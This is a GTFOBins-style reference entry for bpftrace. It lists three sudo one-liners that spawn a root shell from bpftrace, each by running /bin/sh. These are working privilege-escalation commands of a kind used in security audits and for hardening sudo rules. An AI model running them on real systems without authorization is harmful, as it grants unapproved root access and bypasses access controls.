# GTFOBin: bpftrace

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo bpftrace -e 'BEGIN {system("/bin/sh");exit()}'
```

```
TF=$(mktemp)
echo 'BEGIN {system("/bin/sh");exit()}' >$TF
sudo bpftrace $TF
```

```
sudo bpftrace -c /bin/sh -e 'END {exit()}'
```